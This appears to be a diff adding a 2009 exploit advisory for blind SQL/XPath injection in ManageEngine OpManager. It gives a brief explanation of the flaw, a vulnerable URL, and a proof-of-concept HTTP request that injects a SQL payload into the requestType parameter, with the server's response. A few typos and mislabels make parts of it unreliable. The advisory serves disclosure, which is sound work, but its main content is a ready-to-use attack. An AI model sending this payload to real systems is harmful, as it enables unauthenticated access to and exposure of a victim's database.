@@ -1,0 +1,43 @@
+*******************************Blind SQL/XPath injection in OPMANAGER***********************************88
+
+
+
+
+# Exploit Title: Blind SQL/XPath injection in OPMANAGER
+# Date: 8-Dec-09
+# Author: Asheesh Kumar Mani Tripathi 
+#         AKS IT Services
+# Software Link: http://www.manageengine.com/products/opmanager/download.html
+# Version: [app version]
+
+
+
+Description
+
+SQL injection is a vulnerability that allows an attacker to alter backend SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters.  This is one of the most common application layer attacks currently being used on the Internet. Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable to SQL Injection.
+XPath Injection is an attack technique used to exploit web sites that construct XPath queries from user-supplied input.
+
+Impact
+An unauthenticated attacker may execute arbitrary SQL/XPath statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information.
+
+Vulnerable:
+
+http://<Ip adress:8060>overview.do?selectedTab=Home&operation=showVoipDashboard_ajax&requestType=AJAX[Sql injectio ]&isFromInfra=yes HTTP/1.0
+
+
+Get 
+overview.do?selectedTab=Home&operation=showVoipDashboard_ajax&requestType=AJAX'+and+313
+37-31337=0+--+&isFromInfra=yes HTTP/1.0
+Accept: */*
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)
+Host: localhost:8060
+Cookie: JSESSIONID=54FA92CB3ADBA4C71B35C69251FFE9A1;flashversionInstalled=0.0.0
+Connection: Close
+Pragma: no-cache
+
+Request:
+HTTP/1.1 200 OK
+Date: Tues, 08 Dec 2009 11:26:21 GMT
+Server: Apache/2.0.47 (Win32) mod_jk/1.2.5
+Connection: close
+Content-Type: text/html;charset=UTF-8
